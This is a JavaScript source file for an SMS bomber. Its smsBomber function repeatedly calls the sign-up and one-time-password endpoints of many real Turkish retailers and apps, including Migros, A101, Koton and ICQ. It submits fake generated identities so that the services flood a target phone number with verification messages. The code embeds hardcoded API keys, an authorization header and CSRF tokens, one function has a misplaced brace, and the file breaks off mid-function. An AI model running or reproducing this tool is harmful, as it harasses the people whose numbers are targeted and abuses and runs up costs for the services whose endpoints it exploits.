async function delaySystem(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

async function smsBomber({ phone, amount }) {
    let systemFinishedT = false;
    console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] > `) + chalk.greenBright("[smsSystem]") + chalk.blueBright(` ${phone} numarasına ${amount} adet sms gönderiliyor.`));
    const queryPromise = new Promise(async (resolve, reject) => {
        try {
            let dataSb = {
                startDate: Date.now(),
                phone: phone,
                amount: amount,
                total: 0,
                success: 0,
                error: 0,
            };

            async function kigili(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://www.kigili.com/users/registration/",
                    form: {
                        first_name: faker.name.firstName(),
                        last_name: faker.name.lastName(),
                        email: faker.internet.email(),
                        phone: "0" + no,
                        password: "nwejkfıower32",
                        confirm: "true",
                        kvkk: "true",
                        next: "",
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 202) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Kigili]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Kigili]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            async function kahvedunyasi(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://core.kahvedunyasi.com/api/users/sms/send",
                    form: {
                        mobile_number: no,
                        token_type: "register_token",
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [KahveDünyası]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [KahveDünyası]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            async function wmf(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: "https://www.wmf.com.tr/users/register/",
                    form: {
                        confirm: "true",
                        date_of_birth: "1956-03-01",
                        email: faker.internet.email(),
                        email_allowed: "true",
                        first_name: faker.name.firstName(),
                        gender: "male",
                        last_name: faker.name.lastName(),
                        password: "nwejkfıower32",
                        phone: "0" + no,
                    },
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 202) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [WMF]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [WMF]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            async function tiklagelsin(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request({
                    url: "https://www.tiklagelsin.com/user/graphql",
                    headers: {
                        accept: "*/*",
                        "accept-language": "tr,tr-TR;q=0.9,en-US;q=0.8,en;q=0.7",
                        "content-type": "application/json",
                        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "x-device-type": "3",
                        "x-merchant-type": "0",
                        "x-no-auth": "true",
                        Referer: "https://www.tiklagelsin.com/a/",
                        "Referrer-Policy": "strict-origin-when-cross-origin",
                    },
                    body: `{\"operationName\":\"GENERATE_OTP\",\"variables\":{\"phone\":\"+90${no}",\"challenge\":\"85033055-4b81-4f6f-aed2-4a8ee1dce968\",\"deviceUniqueId\":\"web_6f59c0e5-3a0a-4bd3-907d-3cd973152333\"},\"query\":\"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\\n  generateOtp(\\n    phone: $phone\\n    challenge: $challenge\\n    deviceUniqueId: $deviceUniqueId\\n  )\\n}\\n\"}`,
                    method: "POST",
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [TiklaGelsin]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [TiklaGelsin]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function bim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://bim.veesk.net:443/service/v1.0/account/login',
                    json: {
                        "phone": no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Bim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Bim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function sok(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.ceptesok.com:443/api/users/sendsms',
                    json: {
                        "mobile_number": no,
                        "token_type": "register_token"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Sok]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Sok]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function migros(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp',
                    json: {
                        "phoneNumber": no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Migros]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Migros]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function a101(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.a101.com.tr:443/users/otp-login/',
                    json: {
                        "phone": "0"+no,
                        "next": "/a101-kapida"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [A101]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [A101]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function sakasu(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.sakasu.com.tr:443/app/api_register/step1',
                    form: {
                        "phone": "0"+no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Sakasu]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Sakasu]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });     
            }
            
            function zarinplus(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.zarinplus.com/user/zarinpal-login',
                    json: {
                        "phone_number": "90"+no,
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [ZarinPlus]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [ZarinPlus]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function coregap(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://core.gap.im/v1/user/add.json?mobile=90${no}`,
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [CoreGap]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [CoreGap]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function icq(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90${no}&platform=ios&r=796356153&smsFormatType=human`,
                    headers: {
                        "Accept": "*/*",
                        "Content-Type": "application/x-www-form-urlencoded", 
                        "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4", 
                        "Accept-Language": "tr-TR,en;q=0.9", 
                        "Accept-Encoding": "gzip, deflate"
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [ICQ]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [ICQ]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                }
                });
            }

            function naosstars(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://shop.naosstars.com/users/register/`,
                    json: {
                        "email": `${faker.internet.email()}`,
                        "first_name": `${faker.name.firstName()}`,
                        "last_name": `${faker.name.lastName()}`,
                        "password": "nwejkDsOpOJıower32.",
                        "date_of_birth": "1975-12-31",
                        "phone": `0${no}`,
                        "gender": "male",
                        "kvkk": "true",
                        "contact": "true",
                        "confirm": "true"
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [NaosStars]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [NaosStars]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function rentiva(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://rentiva.com:443/api/Account/Login`,
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Content-Type": "application/json", 
                        "Origin": "ionic://localhost", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", 
                        "Accept-Language": "tr-TR,tr;q=0.9" 
                    },
                    json: {
                        "appleId": null,
                        "code": "", 
                        "email": "", 
                        "facebookId": null,
                        "googleId": null,
                        "lastName": "", 
                        "name": "", 
                        "phone": no,
                        "type": 1
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Rentiva]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Rentiva]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            async function loncamarket(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.loncamarket.com/lid/identity/sendconfirmationcode',
                    json: {
                        "Address": no,
                        "ConfirmationType": 0
                    },
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", 
                        "Accept": "application/json, text/javascript, */*; q=0.01", 
                        "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", 
                        "Accept-Encoding": "gzip, deflate", "Content-Type": 
                        "application/json; charset=utf-8", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Origin": "https://www.loncamarket.com", 
                        "Dnt": "1", 
                        "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", 
                        "Sec-Fetch-Dest": "empty", 
                        "Sec-Fetch-Mode": "cors", 
                        "Sec-Fetch-Site": "same-origin", 
                        "Te": "trailers", 
                        "Connection": "close"
                    },
                    verify: false,
                    timeout: 3000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [LoncaMarket]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [LoncaMarket]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function kimgb(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp',
                    json: {
                        "msisdn": `90${no}`
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Kimgb]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Kimgb]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function tazi(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin',
                    json: {
                        "cep_tel": no,
                        "cep_tel_ulkekod": "90",
                    },
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Content-Type": "application/json;charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Tazi]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Tazi]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function evidea(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.evidea.com:443/users/register/',
                    data: `--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n`,
                    headers: {
                        "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", 
                        "X-Project-Name": "undefined", 
                        "Accept": "application/json, text/plain, */*", 
                        "X-App-Type": "akinon-mobile", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Cache-Control": "no-store", 
                        "Accept-Encoding": "gzip, deflate", 
                        "X-App-Device": "ios", 
                        "Referer": "https://www.evidea.com/", 
                        "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", 
                        "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Evidea]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Evidea]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function heyscooter(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${no}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9`,
                    headers: {
                        "Accept": "application/json, text/plain, */*", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "HEY!%20Scooter/143 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
                        "Accept-Language": "tr"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [HeyScooter]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [HeyScooter]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function koton(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: `https://www.koton.com:443/users/register/`,
                    headers: {
                        "Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", 
                        "X-Project-Name": "rn-env", 
                        "Accept": "application/json, text/plain, */*", 
                        "X-App-Type": "akinon-mobile", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "en-US,en;q=0.9", 
                        "Cache-Control": "no-store", 
                        "Accept-Encoding": "gzip, deflate", 
                        "X-App-Device": "ios", "Referer": "https://www.koton.com/", 
                        "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", 
                        "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
                    },
                    data: `--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n${faker.internet.email()}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0${no}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n`,
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200 || httpResponse?.statusCode == 201 || httpResponse?.statusCode == 202 || httpResponse?.statusCode == 204 || httpResponse?.statusCode == 205) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Koton]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Koton]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function ipragaz(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp',
                    headers: {
                        "Content-Type": "application/json", 
                        "X-Api-Token": "", 
                        "Authorization": "", "App-Version": "1.3.9", "App-Lang": "en", 
                        "Accept": "*/*", 
                        "App-Name": "ipragaz-mobile", 
                        "Os": "ios", 
                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
                        "Accept-Encoding": "gzip, deflate", 
                        "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4", 
                        "App-Build": "41", "Os-Version": "15.7.7", 
                        "Udid": "73AD2D6E-9FC7-40C1-AFF3-88E67591DCF8", 
                        "Connection": "close"
                    },
                    json: {
                        "birthDate": "2/7/2000", 
                        "carPlate": "31 ABC 31", 
                        "mobileOtp": "f32c79e65cc684a14b15dcb9dc7e9e9d92b2f6d269fd9000a7b75e02cfd8fa63", 
                        "name": "Memati Bas", 
                        "otp": "", 
                        "phoneNumber": no,
                        "playerId": ""
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Ipragaz]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
